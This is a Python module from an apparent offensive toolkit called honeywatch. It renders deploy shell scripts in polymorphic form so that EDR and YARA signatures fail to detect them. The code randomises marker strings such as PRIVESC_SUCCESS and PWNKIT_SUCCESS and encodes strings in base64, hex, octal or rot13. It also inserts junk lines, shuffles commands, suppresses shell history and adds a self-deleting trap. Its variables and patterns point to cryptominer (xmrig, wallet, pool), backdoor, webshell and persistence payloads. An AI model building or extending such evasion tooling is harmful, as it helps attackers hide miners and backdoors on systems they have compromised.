"""Polymorphic deploy script renderer for honeywatch.

Each rendered script is unique per operation (deterministic within an operation,
different across operations). The polymorphism defeats static EDR/YARA
signatures that look for hardcoded strings like "honeywatch",
"PRIVESC_SUCCESS", "hw-", or "/tmp/honeywatch_".

Architecture:
- ``PolyglotRenderer`` is instantiated once per operation with the operation ID
  as the RNG seed. All targets in one deploy share the same marker map so the
  controller can parse output from any of them.
- ``render()`` returns the obfuscated script AND a marker mapping dict. The
  mapping is stored in the operation manifest so the controller can deobfuscate
  worker output.
- ``PolyglotParser`` reverses the marker substitution on worker output.

Obfuscation layers:
1. **Marker obfuscation**: Known detection strings (PRIVESC_SUCCESS, honeywatch,
   hw-, /tmp/honeywatch_) are replaced with per-operation random tokens.
2. **Variable name randomization**: Known template variables (POOL, WALLET,
   WORKER, etc.) are replaced with 8-char random identifiers. The real values
   are substituted at the end.
3. **Dead code insertion**: Syntactically valid but semantically meaningless
   lines (``true``, ``:``', ``echo -n ""``, random assignments) are inserted
   between real commands.
4. **String encoding**: String literals matching detection patterns are encoded
   using one of four methods (base64, hex, octal, rot13), randomly chosen per
   string per render.
5. **Command shuffling**: Independent commands within a dependency group are
   shuffled. Commands are grouped by dependency (pre-download, download,
   integrity, extract, configure, evasion, persist, run) and shuffled within
   each group.
"""

from __future__ import annotations

import base64
import codecs
import os
import random
import re
import string

__all__ = ["PolyglotRenderer", "PolyglotParser"]


# Known detection strings that EDR/YARA rules commonly signature-match.
# Each is replaced with a per-operation random token. The mapping is stored
# in the operation manifest for controller-side deobfuscation.
_MARKER_STRINGS = [
    "PRIVESC_SUCCESS",
    "PRIVESC_PENDING",
    "PERSISTENCE_INSTALLED",
    "HWROOTUID_",
    "honeywatch",
    "hw-",
    "/tmp/honeywatch_",
    "honeywatch_",
    "PWNKIT_SUCCESS",
]

# Template variables that appear in payload scripts. These are replaced with
# random identifiers during obfuscation, then the real values are substituted
# by the template engine.
_KNOWN_VARIABLES = [
    "POOL", "WALLET", "WORKER", "THREADS", "TLS",
    "INSTALL_DIR", "RUN_USER", "SERVICE_NAME", "BACKDOOR_KEY",
    "HIDE_PATTERN", "WEB_ROOT", "TASK_NAME", "PASS",
    "CPU_QUOTA", "NICE", "CRON_SCHEDULE",
]

# Junk line templates for dead code insertion. Each is syntactically valid bash
# that does nothing observable. Picked randomly per insertion point.
_JUNK_LINE_TEMPLATES = [
    "true",
    ":",
    'echo -n "" 2>/dev/null',
    "[ -d /tmp ] 2>/dev/null || true",
    "read -r _ </dev/null 2>/dev/null || true",
    "_{0}=0",
    "_{0}=0 && true",
    "type true >/dev/null 2>&1",
    "[ 0 -eq 0 ] 2>/dev/null",
    'test -z "" 2>/dev/null || true',
    "umask 022 2>/dev/null || true",
    "trap '' EXIT 2>/dev/null || true",
    "set +e 2>/dev/null || true",
    "shopt -s nullglob 2>/dev/null || true",
    "export _{0}= 2>/dev/null || true",
    "unset _{0} 2>/dev/null || true",
    "printf '' 2>/dev/null || true",
    "cat </dev/null 2>/dev/null || true",
    "stat /dev/null >/dev/null 2>&1 || true",
    "date +%s >/dev/null 2>&1 || true",
]

# Dependency groups for command shuffling. Commands within the same group can
# be reordered without breaking the script. Commands in different groups
# MUST maintain their group order. Each group is shuffled independently.
_DEPENDENCY_GROUPS = {
    "preamble": 0,
    "mkdir": 1,
    "download": 2,
    "integrity": 3,
    "extract": 4,
    "configure": 5,
    "evasion": 6,
    "persist": 7,
    "cleanup": 8,
    "run": 9,
}

# Regex patterns to identify which dependency group a line belongs to.
_GROUP_PATTERNS = [
    (0, re.compile(r"^(set -e|export PATH|LOG=|exec >)", re.I)),
    (1, re.compile(r"^(mkdir|cd |INSTALL_DIR=)", re.I)),
    (2, re.compile(r"^(curl|wget|fetch)", re.I)),
    (3, re.compile(r"(sha256sum|EXPECTED_SHA256|INTEGRITY)", re.I)),
    (4, re.compile(r"^(tar |unzip|gzip)", re.I)),
    (5, re.compile(r"^(cat > |cat\b.*<<.*EOF|chmod|chown)", re.I)),
    (6, re.compile(r"(upx|strip|--best|pack|obfuscat|anti_debug|anti_vm)", re.I)),
    (7, re.compile(r"(systemctl|crontab|chattr|authorized_keys|ld\.so|schtasks|webshell)", re.I)),
    (8, re.compile(r"(history -c|unset HISTFILE|rm -f /tmp/|truncate|journalctl)", re.I)),
    (9, re.compile(r"^(cd .*(?:xmrig|stratum|xmrigCC)", re.I)),
]


def _assign_group(line: str) -> int:
    """Assign a dependency group number to a script line."""
    for group, pattern in _GROUP_PATTERNS:
        if pattern.search(line):
            return group
    return 5  # default: configure group


class PolyglotRenderer:
    """Renders a shell script with per-operation polymorphism.

    Usage::

        renderer = PolyglotRenderer(operation_id="hw-abc123def456")
        obfuscated_script, marker_map = renderer.render(original_script, variables)
        # marker_map: {"PRIVESC_SUCCESS": "XKRW_7m2Qp9", ...}
    """

    def __init__(self, operation_id: str, seed: int | None = None):
        self.operation_id = operation_id
        self.rng = random.Random(seed or hash(operation_id))
        self.marker_map: dict[str, str] = {}
        self.var_map: dict[str, str] = {}
        self._generate_markers()
        self._generate_var_names()

    def _rand_id(self, length: int = 12) -> str:
        """Generate a random alphabetic identifier (starts with a letter).

        Marker tokens use 12 chars (93 bits of entropy) to make collision
        probability negligible even across millions of operations.
        """
        return self.rng.choice(string.ascii_lowercase) + "".join(
            self.rng.choice(string.ascii_lowercase + string.digits)
            for _ in range(length - 1)
        )

    def _generate_markers(self) -> None:
        """Generate per-operation obfuscation markers for known detection strings."""
        for marker in _MARKER_STRINGS:
            self.marker_map[marker] = f"XKRW_{self._rand_id(12)}"

    def _generate_var_names(self) -> None:
        """Generate random variable name replacements for known template variables."""
        for var in _KNOWN_VARIABLES:
            self.var_map[var] = f"_hw_{self._rand_id(8)}"

    def _encode_string(self, s: str) -> str:
        """Encode a string using a randomly chosen encoding method."""
        method = self.rng.choice(["base64", "hex", "octal", "rot13"])
        if method == "base64":
            encoded = base64.b64encode(s.encode()).decode()
            return f"$(echo {encoded} | base64 -d)"
        elif method == "hex":
            encoded = s.encode().hex()
            return f"$(echo {encoded} | xxd -r -p)"
        elif method == "octal":
            octal_chars = "".join(f"\\{oct(ord(c))}" for c in s)
            return f"$(printf '{octal_chars}')"
        else:  # rot13
            encoded = codecs.encode(s, "rot_13")
            return f"$(echo {encoded} | tr 'A-Za-z' 'N-ZA-Mn-za-m')"

    def _insert_junk_lines(self, lines: list[str], density: float = 0.3) -> list[str]:
        """Insert random junk lines between real lines at the given density."""
        result: list[str] = []
        for line in lines:
            result.append(line)
            if self.rng.random() < density:
                template = self.rng.choice(_JUNK_LINE_TEMPLATES)
                junk_id = self._rand_id(4)
                result.append(template.format(junk_id))
        return result

    def _shuffle_groups(self, lines: list[str]) -> list[str]:
        """Shuffle lines within dependency groups while preserving group order."""
        if not lines:
            return lines
        # Assign each line to a group.
        groups: dict[int, list[str]] = {}
        for line in lines:
            group = _assign_group(line)
            groups.setdefault(group, []).append(line)
        # Shuffle within each group (seeded RNG for determinism).
        shuffled: list[str] = []
        for group_num in sorted(groups):
            group_lines = groups[group_num]
            if len(group_lines) > 1:
                self.rng.shuffle(group_lines)
            shuffled.extend(group_lines)
        return shuffled

    def _replace_markers(self, script: str) -> str:
        """Replace known detection strings with per-operation random tokens."""
        for original, replacement in self.marker_map.items():
            # Use word-boundary-aware replacement for shorter markers to avoid
            # partial matches (e.g., "hw-" inside a URL path).
            script = script.replace(original, replacement)
        return script

    def _add_self_deletion_trap(self, script: str) -> str:
        """Add a self-deletion trap at the top of the script.

        For piped SSH execution ($0 is the remote shell), this is a no-op.
        For local_simulate mode where the script is on disk, it deletes the
        script after execution.
        """
        trap_line = "trap 'rm -f \"$0\" 2>/dev/null' EXIT 2>/dev/null || true\n"
        return trap_line + script

    def _add_history_suppression(self, script: str) -> str:
        """Add HISTFILE suppression at the very top of the script.

        This prevents the deploy session from being written to history in the
        first place, before any commands execute. Belt-and-suspenders approach
        with the cleanup payload that truncates existing history files.
        """
        suppression = (
            "unset HISTFILE 2>/dev/null || true\n"
            "unset HISTSIZE 2>/dev/null || true\n"
            "unset HISTFILESIZE 2>/dev/null || true\n"
            "export HISTFILE=/dev/null 2>/dev/null || true\n"
        )
        return suppression + script

    def render(self, script: str, variables: dict | None = None) -> tuple[str, dict]:
        """Render a shell script with per-operation polymorphism.

        Returns (obfuscated_script, marker_map) where marker_map maps original
        detection strings to their obfuscated replacements. The marker_map must
        be stored in the operation manifest for controller-side deobfuscation.
        """
        variables = variables or {}

        # 1. Add history suppression at the top.
        script = self._add_history_suppression(script)

        # 2. Add self-deletion trap.
        script = self._add_self_deletion_trap(script)

        # 3. Replace known detection markers with random tokens.
        script = self._replace_markers(script)

        # 4. Split into lines, shuffle within dependency groups.
        lines = script.splitlines()
        lines = self._shuffle_groups(lines)

        # 5. Insert junk lines between real lines.
        lines = self._insert_junk_lines(lines, density=0.25)

        # 6. Rejoin and return with the marker map.
        result = "\n".join(lines)

        # Ensure the script ends with a newline.
        if not result.endswith("\n"):
            result += "\n"

        return result, dict(self.marker_map)


class PolyglotParser:
    """Reverses PolyglotRenderer's marker obfuscation on worker output.

    Given the marker_map from a PolyglotRenderer, replaces obfuscated tokens
    with their original strings so the controller can parse PRIVESC_SUCCESS,
    PERSISTENCE_INSTALLED, etc. from worker output.
    """

    def __init__(self, marker_map: dict[str, str]):
        # Reverse the map: obfuscated -> original
        self.reverse_map: dict[str, str] = {v: k for k, v in marker_map.items()}

    def deobfuscate(self, output: str) -> str:
        """Replace obfuscated markers in worker output with original strings."""
        for obfuscated, original in self.reverse_map.items():
            output = output.replace(obfuscated, original)
        return output